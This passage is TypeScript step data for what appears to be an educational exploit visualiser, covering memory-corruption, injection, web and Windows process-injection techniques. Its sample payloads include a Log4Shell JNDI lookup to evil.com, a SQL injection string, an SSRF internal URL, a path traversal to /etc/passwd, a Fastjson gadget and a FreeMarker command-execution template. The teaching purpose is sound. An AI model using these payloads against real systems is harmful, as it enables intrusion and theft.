      { id: 1, title: t.heap_safe_title, description: t.heap_safe_desc, codeHighlight: [5], heapChunk1Content: "SafeData123", heapChunk2Content: "", heapChunk2Header: "Header (Sz: 16)", highlightRegion: 'chunk1' },
      { id: 2, title: t.heap_bound_title, description: t.heap_bound_desc, codeHighlight: [5], heapChunk1Content: "FullChunkData111", heapChunk2Content: "", heapChunk2Header: "Header (Sz: 16)", highlightRegion: 'chunk1' },
      { id: 3, title: t.heap_over_title, description: t.heap_over_desc, codeHighlight: [5], heapChunk1Content: "FullChunkData111OVER", heapChunk2Content: "", heapChunk2Header: "Corrupt (0x5245564F)", highlightRegion: 'chunk2_header', isCorrupted: true },
      { id: 4, title: t.heap_crash_title, description: t.heap_crash_desc, codeHighlight: [6], heapChunk1Content: "FullChunkData111OVER", heapChunk2Content: "", heapChunk2Header: "Corrupt (0x5245564F)", highlightRegion: 'chunk2_header', isCorrupted: true }
    ];
  } else if (type === ExploitType.WAF) {
      return [
          { id: 0, title: t.waf_req_title, description: t.waf_req_desc, codeHighlight: [2, 3, 4], wafStep: 'request' },
          { id: 1, title: t.waf_norm_title, description: t.waf_norm_desc, codeHighlight: [5, 6], wafStep: 'normalization' },
          { id: 2, title: t.waf_match_title, description: t.waf_match_desc, codeHighlight: [9, 10, 11, 12], wafStep: 'matching', wafRuleMatch: "OR 1=1 (SID: 942100)" },
          { id: 3, title: t.waf_block_title, description: t.waf_block_desc, codeHighlight: [13, 14], wafStep: 'block' },
      ];
  } else if (type === ExploitType.IPS) {
      return [
          { id: 0, title: t.ips_cap_title, description: t.ips_cap_desc, codeHighlight: [2, 3], ipsStep: 'capture' },
          { id: 1, title: t.ips_dpi_title, description: t.ips_dpi_desc, codeHighlight: [4, 5, 6, 7], ipsStep: 'dpi' },
          { id: 2, title: t.ips_alert_title, description: t.ips_alert_desc, codeHighlight: [9, 10], ipsStep: 'alert' },
          { id: 3, title: t.ips_drop_title, description: t.ips_drop_desc, codeHighlight: [11, 12, 13, 14], ipsStep: 'drop' },
      ];
  } else if (type === ExploitType.STACK) {
    return [
      { id: 0, title: t.stack_init_title, description: t.stack_init_desc, codeHighlight: [2], stackBufferContent: "", stackEBPContent: av.ebp, stackRetContent: av.ret, stackInstructionPointer: av.eipNormal },
      { id: 1, title: t.stack_normal_title, description: t.stack_normal_desc, codeHighlight: [4], stackBufferContent: "AAAA", stackEBPContent: av.ebp, stackRetContent: av.ret, stackInstructionPointer: av.eipNormal, highlightRegion: 'buffer' },
      { id: 2, title: t.stack_fill_title, description: t.stack_fill_desc, codeHighlight: [4], stackBufferContent: "AAAAAAAA", stackEBPContent: av.ebp, stackRetContent: av.ret, stackInstructionPointer: av.eipNormal, highlightRegion: 'buffer' },
      { id: 3, title: t.stack_over_ebp_title, description: t.stack_over_ebp_desc, codeHighlight: [4], stackBufferContent: "AAAAAAAABBBB", stackEBPContent: av.ebpCorrupt, stackRetContent: av.ret, stackInstructionPointer: av.eipNormal, isCorrupted: true, highlightRegion: 'ebp' },
      { id: 4, title: t.stack_over_ret_title, description: t.stack_over_ret_desc, codeHighlight: [4], stackBufferContent: "AAAAAAAABBBBCCCC", stackEBPContent: av.ebpCorrupt, stackRetContent: av.retCorrupt, stackInstructionPointer: av.eipNormal, isCorrupted: true, highlightRegion: 'ret' },
      { id: 5, title: t.stack_ret_title, description: t.stack_ret_desc, codeHighlight: [5], stackBufferContent: "AAAAAAAABBBBCCCC", stackEBPContent: av.ebpCorrupt, stackRetContent: av.retCorrupt, stackInstructionPointer: av.eipHijack, isCorrupted: true, highlightRegion: 'ret' }
    ];
  } else if (type === ExploitType.UAF) {
    return [
        { id: 0, title: t.uaf_alloc_title, description: t.uaf_alloc_desc, codeHighlight: [2, 3], uafSlotState: 'objA', uafPtr1State: 'pointing', uafPtr2State: 'null' },
        { id: 1, title: t.uaf_free_title, description: t.uaf_free_desc, codeHighlight: [4], uafSlotState: 'free', uafPtr1State: 'pointing', uafPtr2State: 'null' },
        { id: 2, title: t.uaf_realloc_title, description: t.uaf_realloc_desc, codeHighlight: [6, 7], uafSlotState: 'objB', uafPtr1State: 'pointing', uafPtr2State: 'pointing' },
        { id: 3, title: t.uaf_access_title, description: t.uaf_access_desc, codeHighlight: [8], uafSlotState: 'objB', uafPtr1State: 'pointing', uafPtr2State: 'pointing', isCorrupted: true }
    ];
  } else if (type === ExploitType.FORMAT_STRING) {
    return [
        { id: 0, title: t.fmt_call_title, description: t.fmt_call_desc, codeHighlight: [3], fmtStackValues: ["0x08048000", "0xFFFFD100", "0x00000001", "0xCAFEBABE"], fmtOutput: "" },
        { id: 1, title: t.fmt_parse_1_title, description: t.fmt_parse_1_desc, codeHighlight: [3], fmtStackValues: ["0x08048000", "0xFFFFD100", "0x00000001", "0xCAFEBABE"], fmtOutput: "0x08048000", fmtReadIndex: 0 },
        { id: 2, title: t.fmt_parse_2_title, description: t.fmt_parse_2_desc, codeHighlight: [3], fmtStackValues: ["0x08048000", "0xFFFFD100", "0x00000001", "0xCAFEBABE"], fmtOutput: "0x08048000 0xFFFFD100", fmtReadIndex: 1, isCorrupted: true }
    ];
  } else if (type === ExploitType.INTEGER_OVERFLOW) {
    return [
        { id: 0, title: t.int_calc_title, description: t.int_calc_desc, codeHighlight: [4], intMathA: 240, intMathB: 20, intMathReal: 260, intMathResult: 4, intBufferState: 'none' },
        { id: 1, title: t.int_wrap_title, description: t.int_wrap_desc, codeHighlight: [4], intMathA: 240, intMathB: 20, intMathReal: 260, intMathResult: 4, intBufferState: 'none' },
        { id: 2, title: t.int_alloc_title, description: t.int_alloc_desc, codeHighlight: [8], intMathA: 240, intMathB: 20, intMathReal: 260, intMathResult: 4, intBufferState: 'small' },
        { id: 3, title: t.int_overflow_title, description: t.int_overflow_desc, codeHighlight: [11], intMathA: 240, intMathB: 20, intMathReal: 260, intMathResult: 4, intBufferState: 'overflow', isCorrupted: true }
    ];
  } else if (type === ExploitType.DOUBLE_FREE) {
    return [
        { id: 0, title: t.df_alloc_title, description: t.df_alloc_desc, codeHighlight: [2], dfChunkState: 'alloc', dfBinList: [], dfPtr1: 'ptr' },
        { id: 1, title: t.df_free1_title, description: t.df_free1_desc, codeHighlight: [4], dfChunkState: 'free', dfBinList: ["0x804A008"], dfPtr1: 'ptr' },
        { id: 2, title: t.df_free2_title, description: t.df_free2_desc, codeHighlight: [5], dfChunkState: 'double_free', dfBinList: ["0x804A008", "0x804A008"], dfPtr1: 'ptr' },
        { id: 3, title: t.df_malloc1_title, description: t.df_malloc1_desc, codeHighlight: [8], dfChunkState: 'alloc', dfBinList: ["0x804A008"], dfPtr1: 'ptr', dfPtr2: 'p1' },
        { id: 4, title: t.df_malloc2_title, description: t.df_malloc2_desc, codeHighlight: [9], dfChunkState: 'overlap', dfBinList: [], dfPtr1: 'ptr', dfPtr2: 'p1', dfPtr3: 'p2', isCorrupted: true }
    ];
  } else if (type === ExploitType.ROP) {
    return [
        { id: 0, title: t.rop_overflow_title, description: t.rop_overflow_desc, codeHighlight: [5], ropAction: 'overflow', ropStack: [{ label: "Buffer", value: "PADDING...", type: 'padding' }, { label: "Return Address", value: "0x401105", type: 'gadget', active: true }, { label: "Arg 1", value: "0x402000", type: 'data' }, { label: "Next Return", value: "0x401040", type: 'target' }], ropRegs: { rip: '0x00401200', rdi: '0x00000000', rsp: '0x7FFFF100' } },
        { id: 1, title: t.rop_ret_title, description: t.rop_ret_desc, codeHighlight: [8], ropAction: 'ret', ropStack: [{ label: "Buffer", value: "PADDING...", type: 'padding' }, { label: "Return Address", value: "0x401105", type: 'gadget', active: true }, { label: "Arg 1", value: "0x402000", type: 'data' }, { label: "Next Return", value: "0x401040", type: 'target' }], ropRegs: { rip: '0x00401105', rdi: '0x00000000', rsp: '0x7FFFF108' } },
        { id: 2, title: t.rop_gadget1_title, description: t.rop_gadget1_desc, codeHighlight: [2], ropAction: 'pop', ropStack: [{ label: "Buffer", value: "PADDING...", type: 'padding' }, { label: "Return Address", value: "0x401105", type: 'gadget' }, { label: "Arg 1", value: "0x402000", type: 'data', active: true }, { label: "Next Return", value: "0x401040", type: 'target' }], ropRegs: { rip: '0x00401106', rdi: '0x402000', rsp: '0x7FFFF110' } },
        { id: 3, title: t.rop_system_title, description: t.rop_system_desc, codeHighlight: [3], ropAction: 'exec', ropStack: [{ label: "Buffer", value: "PADDING...", type: 'padding' }, { label: "Return Address", value: "0x401105", type: 'gadget' }, { label: "Arg 1", value: "0x402000", type: 'data' }, { label: "Next Return", value: "0x401040", type: 'target', active: true }], ropRegs: { rip: '0x401040', rdi: '0x402000', rsp: '0x7FFFF118' } }
    ];
  } else if (type === ExploitType.HEAVENS_GATE) {
    return [
        { id: 0, title: t.hg_start_title, description: t.hg_start_desc, codeHighlight: [7], hgMode: 'x86', hgCS: '0x23', hgRegs: { ax: '00000000', ip: '00401000', sp: '0019FFCC' }, hgInstruction: 'push 0x33' },
        { id: 1, title: t.hg_push_title, description: t.hg_push_desc, codeHighlight: [11], hgMode: 'x86', hgCS: '0x23', hgRegs: { ax: '00000000', ip: '00401002', sp: '0019FFC8' }, hgInstruction: 'call next' },
        { id: 2, title: t.hg_gate_title, description: t.hg_gate_desc, codeHighlight: [14], hgMode: 'x86', hgCS: '0x23', hgRegs: { ax: '00000000', ip: '00401007', sp: '0019FFC4' }, hgInstruction: 'retf' },
        { id: 3, title: t.hg_native_title, description: t.hg_native_desc, codeHighlight: [18], hgMode: 'x64', hgCS: '0x33', hgRegs: { ax: '0000000000000000', ip: '000000000040100C', sp: '000000000019FFD0' }, hgInstruction: 'mov rax, ...' },
        { id: 4, title: t.hg_sys_title, description: t.hg_sys_desc, codeHighlight: [19], hgMode: 'x64', hgCS: '0x33', hgRegs: { ax: '123456789ABC', ip: '0000000000401016', sp: '000000000019FFD0' }, hgInstruction: 'syscall' }
    ];
  } else if (type === ExploitType.REFLECTIVE_DLL) {
    return [
        { id: 0, title: t.rdll_read_title, description: t.rdll_read_desc, codeHighlight: [6], rdllState: 'idle', rdllInjector: { action: 'ReadFile(DLL)', active: true }, rdllTarget: { memory: [], threadStatus: 'Waiting' } },
        { id: 1, title: t.rdll_alloc_title, description: t.rdll_alloc_desc, codeHighlight: [9], rdllState: 'alloc', rdllInjector: { action: 'VirtualAllocEx(RWX)', active: true }, rdllTarget: { memory: [{ label: '0x00400000', type: 'free' }], threadStatus: 'Waiting' } },
        { id: 2, title: t.rdll_write_title, description: t.rdll_write_desc, codeHighlight: [12], rdllState: 'write', rdllInjector: { action: 'WriteProcessMemory', active: true }, rdllTarget: { memory: [{ label: '0x00400000', type: 'dll_raw', active: true, highlight: true }], threadStatus: 'Waiting' } },
        { id: 3, title: t.rdll_thread_title, description: t.rdll_thread_desc, codeHighlight: [18], rdllState: 'boot', rdllInjector: { action: 'CreateRemoteThread', active: true }, rdllTarget: { memory: [{ label: '0x00400000', type: 'dll_mapped' }], threadStatus: 'Running Malware' } },
        { id: 4, title: t.rdll_reloc_title, description: t.rdll_reloc_desc, codeHighlight: [24], rdllState: 'reloc', rdllInjector: { action: 'Idle', active: false }, rdllTarget: { memory: [{ label: '0x00400000', type: 'dll_mapped', active: true }], threadStatus: 'ReflectiveLoader' } },
        { id: 5, title: t.rdll_main_title, description: t.rdll_main_desc, codeHighlight: [25], rdllState: 'exec', rdllInjector: { action: 'Idle', active: false }, rdllTarget: { memory: [{ label: '0x00400000', type: 'dll_mapped' }], threadStatus: 'DllMain Executed' } }
    ];
  } else if (type === ExploitType.PROCESS_HOLLOWING) {
    return [
        { id: 0, title: t.ph_create_title, description: t.ph_create_desc, codeHighlight: [6], phState: 'create', phTarget: { name: 'svchost.exe', status: 'Suspended', memoryContent: 'LegitCode', entryPoint: '0x7FF...Legit' } },
        { id: 1, title: t.ph_unmap_title, description: t.ph_unmap_desc, codeHighlight: [9], phState: 'unmap', phTarget: { name: 'svchost.exe', status: 'Suspended', memoryContent: 'Empty', entryPoint: '0x7FF...Legit' } },
        { id: 2, title: t.ph_alloc_title, description: t.ph_alloc_desc, codeHighlight: [12], phState: 'alloc', phTarget: { name: 'svchost.exe', status: 'Suspended', memoryContent: 'Empty', entryPoint: '0x7FF...Legit' } },
        { id: 3, title: t.ph_write_title, description: t.ph_write_desc, codeHighlight: [15], phState: 'write', phTarget: { name: 'svchost.exe', status: 'Suspended', memoryContent: 'MalPayload', entryPoint: '0x7FF...Legit' } },
        { id: 4, title: t.ph_ctx_title, description: t.ph_ctx_desc, codeHighlight: [19], phState: 'write', phTarget: { name: 'svchost.exe', status: 'Suspended', memoryContent: 'MalPayload', entryPoint: '0x400000' } },
        { id: 5, title: t.ph_resume_title, description: t.ph_resume_desc, codeHighlight: [22], phState: 'resume', phTarget: { name: 'svchost.exe', status: 'Hollowed', memoryContent: 'MalPayload', entryPoint: '0x400000' } }
    ];
  } else if (type === ExploitType.THREAD_HIJACKING) {
    return [
        { id: 0, title: t.th_open_title, description: t.th_open_desc, codeHighlight: [6], thState: 'running', thThread: { id: 1024, status: 'Running', rip: '0x401005', codeBlock: 'Legit' } },
        { id: 1, title: t.th_suspend_title, description: t.th_suspend_desc, codeHighlight: [9], thState: 'suspend', thThread: { id: 1024, status: 'Suspended', rip: '0x401005', codeBlock: 'Legit' } },
        { id: 2, title: t.th_getctx_title, description: t.th_getctx_desc, codeHighlight: [14], thState: 'suspend', thThread: { id: 1024, status: 'Suspended', rip: '0x401005', codeBlock: 'Legit' } },
        { id: 3, title: t.th_write_title, description: t.th_write_desc, codeHighlight: [18], thState: 'inject', thThread: { id: 1024, status: 'Suspended', rip: '0x401005', codeBlock: 'Legit' } },
        { id: 4, title: t.th_setctx_title, description: t.th_setctx_desc, codeHighlight: [22], thState: 'context', thThread: { id: 1024, status: 'Suspended', rip: '0x900000', codeBlock: 'Shellcode' } },
        { id: 5, title: t.th_resume_title, description: t.th_resume_desc, codeHighlight: [25], thState: 'resume', thThread: { id: 1024, status: 'Running', rip: '0x900000', codeBlock: 'Shellcode' } }
    ];
  } else if (type === ExploitType.NETWORK_MAPPING) {
    const mockTargets = [{ ip: '1.2.3.4', port: 80, status: 'idle' }, { ip: '5.6.7.8', port: 443, status: 'idle' }, { ip: '10.0.0.1', port: 22, status: 'idle' }, { ip: '11.22.33.44', port: 3306, status: 'idle' }, { ip: '1.2.3.5', port: 8080, status: 'idle' }, { ip: '5.6.7.9', port: 21, status: 'idle' }, { ip: '10.0.0.2', port: 6379, status: 'idle' }, { ip: '11.22.33.45', port: 445, status: 'idle' }];
    return [
        { id: 0, title: t.nm_discovery_title, description: t.nm_discovery_desc, codeHighlight: [2, 3, 4], nmStep: 'discovery', nmScannerActive: true, nmTargets: mockTargets.map((t, idx) => ({ ...t, status: idx < 3 ? 'scanned' : 'idle' } as any)) },
        { id: 1, title: t.nm_probing_title, description: t.nm_probing_desc, codeHighlight: [5, 6, 7, 8], nmStep: 'probing', nmScannerActive: true, nmTargets: mockTargets.map((t, idx) => ({ ...t, status: idx < 5 ? 'scanned' : 'idle' } as any)) },
        { id: 2, title: t.nm_finger_title, description: t.nm_finger_desc, codeHighlight: [10, 11, 12], nmStep: 'fingerprinting', nmScannerActive: true, nmTargets: mockTargets.map((t, idx) => ({ ...t, status: idx < 6 ? 'identified' : 'idle', app: idx === 0 ? 'Nginx' : idx === 1 ? 'Apache' : idx === 2 ? 'SSH' : idx === 3 ? 'MySQL' : idx === 4 ? 'Tomcat' : idx === 5 ? 'FTP' : undefined } as any)) },
        { id: 3, title: t.nm_index_title, description: t.nm_index_desc, codeHighlight: [14, 15], nmStep: 'indexing', nmScannerActive: false, nmTargets: mockTargets.map((t) => ({ ...t, status: 'identified', app: 'Tagged' } as any)) },
        { id: 4, title: t.nm_query_title, description: t.nm_query_desc, codeHighlight: [19, 20, 21], nmStep: 'query', nmScannerActive: false, nmQuery: 'app="Nginx" && country="CN"', nmTargets: mockTargets.map((t, idx) => ({ ...t, status: idx === 0 ? 'identified' : 'idle', app: idx === 0 ? 'MATCH' : '...' } as any)) }
    ];
  } else if (type === ExploitType.SQLI) {
    return [
        { id: 0, title: t.sqli_input_title, description: t.sqli_input_desc, codeHighlight: [3], sqliStep: 'input', sqliInput: "' OR '1'='1", sqliDbResult: [] },
        { id: 1, title: t.sqli_req_title, description: t.sqli_req_desc, codeHighlight: [3], sqliStep: 'request', sqliInput: "' OR '1'='1", sqliDbResult: [] },
        { id: 2, title: t.sqli_code_title, description: t.sqli_code_desc, codeHighlight: [9], sqliStep: 'query', sqliInput: "' OR '1'='1", sqliDbResult: [] },
        { id: 3, title: t.sqli_query_title, description: t.sqli_query_desc, codeHighlight: [9], sqliStep: 'db', sqliInput: "' OR '1'='1", sqliDbResult: [] },
        { id: 4, title: t.sqli_db_title, description: t.sqli_db_desc, codeHighlight: [11], sqliStep: 'response', sqliInput: "' OR '1'='1", sqliDbResult: [{ id: 1, user: 'admin', role: 'admin' }, { id: 2, user: 'user1', role: 'user' }, { id: 3, user: 'guest', role: 'user' }] }
    ];
  } else if (type === ExploitType.SSRF) {
    return [
      { id: 0, title: t.ssrf_input_title, description: t.ssrf_input_desc, codeHighlight: [2], ssrfStep: 'input', ssrfPayload: "http://127.0.0.1:8080/admin", ssrfInternalData: "" },
      { id: 1, title: t.ssrf_req_title, description: t.ssrf_req_desc, codeHighlight: [2], ssrfStep: 'request_out', ssrfPayload: "http://127.0.0.1:8080/admin", ssrfInternalData: "" },
      { id: 2, title: t.ssrf_proc_title, description: t.ssrf_proc_desc, codeHighlight: [10], ssrfStep: 'processing', ssrfPayload: "http://127.0.0.1:8080/admin", ssrfInternalData: "" },
      { id: 3, title: t.ssrf_internal_title, description: t.ssrf_internal_desc, codeHighlight: [10], ssrfStep: 'request_in', ssrfPayload: "http://127.0.0.1:8080/admin", ssrfInternalData: "" },
      { id: 4, title: t.ssrf_res_title, description: t.ssrf_res_desc, codeHighlight: [12], ssrfStep: 'response_final', ssrfPayload: "http://127.0.0.1:8080/admin", ssrfInternalData: "<html>Admin Panel... [SECRETS]</html>" }
    ];
  } else if (type === ExploitType.CSRF) {
    return [
      { id: 0, title: t.csrf_login_title, description: t.csrf_login_desc, codeHighlight: [3], csrfStep: 'login', csrfCookie: true, csrfTab: 'bank', csrfBalance: 5000 },
      { id: 1, title: t.csrf_visit_title, description: t.csrf_visit_desc, codeHighlight: [3], csrfStep: 'visit_malicious', csrfCookie: true, csrfTab: 'evil', csrfBalance: 5000 },
      { id: 2, title: t.csrf_req_title, description: t.csrf_req_desc, codeHighlight: [3], csrfStep: 'auto_request', csrfCookie: true, csrfTab: 'evil', csrfBalance: 5000 },
      { id: 3, title: t.csrf_cookie_title, description: t.csrf_cookie_desc, codeHighlight: [12], csrfStep: 'cookie_attach', csrfCookie: true, csrfTab: 'evil', csrfBalance: 5000 },
      { id: 4, title: t.csrf_server_title, description: t.csrf_server_desc, codeHighlight: [12], csrfStep: 'server_process', csrfCookie: true, csrfTab: 'evil', csrfBalance: 4000 }
    ];
  } else if (type === ExploitType.LOG4SHELL) {
    return [
      { id: 0, title: t.l4s_input_title, description: t.l4s_input_desc, codeHighlight: [7], l4sStep: 'input', l4sPayload: "${jndi:ldap://evil.com/x}" },
      { id: 1, title: t.l4s_logging_title, description: t.l4s_logging_desc, codeHighlight: [11], l4sStep: 'logging', l4sPayload: "${jndi:ldap://evil.com/x}" },
      { id: 2, title: t.l4s_lookup_title, description: t.l4s_lookup_desc, codeHighlight: [11], l4sStep: 'lookup', l4sPayload: "${jndi:ldap://evil.com/x}" },
      { id: 3, title: t.l4s_ldap_req_title, description: t.l4s_ldap_req_desc, codeHighlight: [11], l4sStep: 'ldap_req', l4sPayload: "${jndi:ldap://evil.com/x}" },
      { id: 4, title: t.l4s_ldap_res_title, description: t.l4s_ldap_res_desc, codeHighlight: [11], l4sStep: 'ldap_res', l4sPayload: "${jndi:ldap://evil.com/x}" },
      { id: 5, title: t.l4s_class_title, description: t.l4s_class_desc, codeHighlight: [11], l4sStep: 'class_download', l4sPayload: "${jndi:ldap://evil.com/x}" },
      { id: 6, title: t.l4s_rce_title, description: t.l4s_rce_desc, codeHighlight: [11], l4sStep: 'rce', l4sPayload: "${jndi:ldap://evil.com/x}" }
    ];
  } else if (type === ExploitType.NEXTJS_RCE) {
    return [
      { id: 0, title: t.nrce_bg_title, description: t.nrce_bg_desc, codeHighlight: [5], nextRceStep: 'craft_payload' },
      { id: 1, title: t.nrce_craft_title, description: t.nrce_craft_desc, codeHighlight: [5], nextRceStep: 'send_poison' },
      { id: 2, title: t.nrce_write_title, description: t.nrce_write_desc, codeHighlight: [14], nextRceStep: 'cache_write' },
      { id: 3, title: t.nrce_trigger_title, description: t.nrce_trigger_desc, codeHighlight: [11], nextRceStep: 'trigger_render' },
      { id: 4, title: t.nrce_deser_title, description: t.nrce_deser_desc, codeHighlight: [11], nextRceStep: 'deserialization' },
      { id: 5, title: t.nrce_exec_title, description: t.nrce_exec_desc, codeHighlight: [11], nextRceStep: 'execution' }
    ];
  } else if (type === ExploitType.XXE) {
    return [
      { id: 0, title: t.xxe_input_title, description: t.xxe_input_desc, codeHighlight: [2], xxeStep: 'input' },
      { id: 1, title: t.xxe_parse_title, description: t.xxe_parse_desc, codeHighlight: [9], xxeStep: 'parse' },
      { id: 2, title: t.xxe_resolve_title, description: t.xxe_resolve_desc, codeHighlight: [9], xxeStep: 'resolve' },
      { id: 3, title: t.xxe_access_title, description: t.xxe_access_desc, codeHighlight: [9], xxeStep: 'access' },
      { id: 4, title: t.xxe_response_title, description: t.xxe_response_desc, codeHighlight: [12], xxeStep: 'response' }
    ];
  } else if (type === ExploitType.XSS) {
    return [
      { id: 0, title: t.xss_inject_title, description: t.xss_inject_desc, codeHighlight: [6], xssStep: 'inject' },
      { id: 1, title: t.xss_store_title, description: t.xss_store_desc, codeHighlight: [6], xssStep: 'store' },
      { id: 2, title: t.xss_load_title, description: t.xss_load_desc, codeHighlight: [15], xssStep: 'victim_load' },
      { id: 3, title: t.xss_exec_title, description: t.xss_exec_desc, codeHighlight: [15], xssStep: 'execute' },
      { id: 4, title: t.xss_exfil_title, description: t.xss_exfil_desc, codeHighlight: [15], xssStep: 'exfiltrate' }
    ];
  } else if (type === ExploitType.PATH_TRAVERSAL) {
    const base = '/var/www/downloads';
    const input = '../../etc/passwd';
    const normalize = (p: string) => p.replace(/\\+/g, '/').replace(/\/\./g, '/');
    const resolve = (b: string, p: string) => {
      const parts = [...b.split('/'), ...p.split('/')];
      const stack: string[] = [];
      for (const seg of parts) {
        if (!seg || seg === '.') continue;
        if (seg === '..') { if (stack.length) stack.pop(); continue; }
        stack.push(seg);
      }
      return '/' + stack.join('/');
    };
    const normalized = normalize(input);
    const finalPath = resolve(base, input);
    const leaked = 'root:x:0:0:root:/root:/bin/bash\n...';
    return [
      { id: 0, title: t.pt_input_title, description: t.pt_input_desc, codeHighlight: [2], ptStep: 'input', ptBasePath: base, ptInputPath: input },
      { id: 1, title: t.pt_request_title, description: t.pt_request_desc, codeHighlight: [5], ptStep: 'request', ptBasePath: base, ptInputPath: input },
      { id: 2, title: t.pt_normalize_title, description: t.pt_normalize_desc, codeHighlight: [6], ptStep: 'normalize', ptBasePath: base, ptInputPath: input, ptNormalizedPath: normalized },
      { id: 3, title: t.pt_resolve_title, description: t.pt_resolve_desc, codeHighlight: [6], ptStep: 'resolve', ptBasePath: base, ptInputPath: input, ptNormalizedPath: normalized, ptFinalPath: finalPath },
      { id: 4, title: t.pt_read_title, description: t.pt_read_desc, codeHighlight: [7], ptStep: 'read', ptBasePath: base, ptInputPath: input, ptFinalPath: finalPath, ptFileContent: leaked },
      { id: 5, title: t.pt_response_title, description: t.pt_response_desc, codeHighlight: [12], ptStep: 'response', ptBasePath: base, ptInputPath: input, ptFinalPath: finalPath, ptFileContent: leaked }
    ];
  } else if (type === ExploitType.DESERIALIZATION) {
    return [
      { id: 0, title: t.deser_craft_title, description: t.deser_craft_desc, codeHighlight: [2, 3], deserStep: 'craft' },
      { id: 1, title: t.deser_send_title, description: t.deser_send_desc, codeHighlight: [12], deserStep: 'send' },
      { id: 2, title: t.deser_parse_title, description: t.deser_parse_desc, codeHighlight: [17], deserStep: 'parse' },
      { id: 3, title: t.deser_magic_title, description: t.deser_magic_desc, codeHighlight: [6], deserStep: 'magic_method' },
      { id: 4, title: t.deser_rce_title, description: t.deser_rce_desc, codeHighlight: [8], deserStep: 'rce' }
    ];
  } else if (type === ExploitType.FASTJSON) {
    return [
      { id: 0, title: t.fj_input_title, description: t.fj_input_desc, codeHighlight: [8, 9], fjsonStep: 'input', fjsonPayload: '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl","_bytecodes":["..."],"_name":"Pwned","_tfactory":{"_indentNumber":0}}' },
      { id: 1, title: t.fj_parsing_title, description: t.fj_parsing_desc, codeHighlight: [9], fjsonStep: 'parsing', fjsonJsonStr: '{"@type":"...","...":"..."}', fjsonPayload: '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl",...}' },
      { id: 2, title: t.fj_template_title, description: t.fj_template_desc, codeHighlight: [5], fjsonStep: 'template_injection', fjsonValue: 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl', fjsonTemplate: 'Gadget Class Instantiated' },
      { id: 3, title: t.fj_getvalue_title, description: t.fj_getvalue_desc, codeHighlight: [5, 6], fjsonStep: 'getvalue', fjsonTemplate: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("touch /tmp/pwned") }' },
      { id: 4, title: t.fj_eval_title, description: t.fj_eval_desc, codeHighlight: [10, 11], fjsonStep: 'template_eval', fjsonTemplate: 'Evaluating template expression...' },
      { id: 5, title: t.fj_rce_title, description: t.fj_rce_desc, codeHighlight: [5], fjsonStep: 'rce', fjsonOutput: '$ whoami\nroot\n$ id\nuid=0(root) gid=0(root) groups=0(root)' }
    ];
  } else if (type === ExploitType.AES) {
    return [
      { id: 0, title: t.aes_exp_title, description: t.aes_exp_desc, codeHighlight: [4], aesState: 'key_expansion', aesOperation: 'expand', aesMatrix: ["32", "43", "F6", "A8", "88", "5A", "30", "8D", "31", "31", "98", "A2", "E0", "37", "07", "34"], aesRoundKey: ["2B", "7E", "15", "16", "28", "AE", "D2", "A6", "AB", "F7", "15", "88", "09", "CF", "4F", "3C"], aesRound: 0, aesHighlight: 'key' },
      { id: 1, title: t.aes_init_title, description: t.aes_init_desc, codeHighlight: [6], aesState: 'round_0', aesOperation: 'addroundkey', aesMatrix: ["19", "3D", "E3", "BE", "A0", "F4", "E2", "2B", "9A", "C6", "8D", "2A", "E9", "F8", "48", "08"], aesRoundKey: ["2B", "7E", "15", "16", "28", "AE", "D2", "A6", "AB", "F7", "15", "88", "09", "CF", "4F", "3C"], aesRound: 0, aesHighlight: 'key' },
      { id: 2, title: t.aes_main_title, description: t.aes_main_desc, codeHighlight: [10], aesState: 'rounds_main', aesOperation: 'subbytes', aesMatrix: ["D4", "27", "11", "AE", "E0", "BF", "98", "F1", "B8", "B4", "5D", "E5", "1E", "41", "52", "30"], aesRoundKey: ["A0", "FA", "FE", "17", "88", "54", "2C", "B1", "23", "A3", "39", "39", "2A", "6C", "76", "05"], aesRound: 1, aesHighlight: 'sbox' },
      { id: 3, title: t.aes_main_title, description: t.aes_main_desc, codeHighlight: [11], aesState: 'rounds_main', aesOperation: 'shiftrows', aesMatrix: ["D4", "BF", "5D", "30", "E0", "B4", "52", "AE", "B8", "41", "11", "F1", "1E", "27", "98", "E5"], aesRoundKey: ["A0", "FA", "FE", "17", "88", "54", "2C", "B1", "23", "A3", "39", "39", "2A", "6C", "76", "05"], aesRound: 1, aesHighlight: 'row' },
      { id: 4, title: t.aes_main_title, description: t.aes_main_desc, codeHighlight: [12], aesState: 'rounds_main', aesOperation: 'mixcolumns', aesMatrix: ["04", "66", "81", "E5", "E0", "CB", "19", "9A", "48", "F8", "D3", "7A", "28", "06", "26", "4C"], aesRoundKey: ["A0", "FA", "FE", "17", "88", "54", "2C", "B1", "23", "A3", "39", "39", "2A", "6C", "76", "05"], aesRound: 1, aesHighlight: 'col' },
      { id: 5, title: t.aes_final_title, description: t.aes_final_desc, codeHighlight: [18], aesState: 'round_final', aesOperation: 'addroundkey', aesMatrix: ["39", "02", "DC", "19", "25", "DC", "11", "6A", "84", "09", "85", "0B", "1D", "FB", "97", "32"], aesRoundKey: ["D0", "14", "F9", "A8", "C9", "EE", "25", "89", "E1", "3F", "0C", "C8", "B6", "63", "0C", "A6"], aesRound: 10, aesHighlight: 'key' }
    ];
  } else if (type === ExploitType.FILE_UPLOAD) {
    return [
      { id: 0, title: t.fu_input_title, description: t.fu_input_desc, codeHighlight: [3], fuStep: 'input', fuFilename: 'shell.jpg', fuMime: 'image/jpeg' },
      { id: 1, title: t.fu_upload_title, description: t.fu_upload_desc, codeHighlight: [6], fuStep: 'upload', fuFilename: 'shell.jpg', fuMime: 'image/jpeg' },
      { id: 2, title: t.fu_store_title, description: t.fu_store_desc, codeHighlight: [9], fuStep: 'store', fuTmpPath: '/tmp/upload/abc123', fuSavePath: '/var/www/app/uploads/shell.php' },
      { id: 3, title: t.fu_access_title, description: t.fu_access_desc, codeHighlight: [13], fuStep: 'web_access', fuWebUrl: 'https://example.com/uploads/shell.php' },
      { id: 4, title: t.fu_exec_title, description: t.fu_exec_desc, codeHighlight: [16], fuStep: 'execute', fuWebUrl: 'https://example.com/uploads/shell.php' }
    ];
  } else if (type === ExploitType.CFW) {
    return [
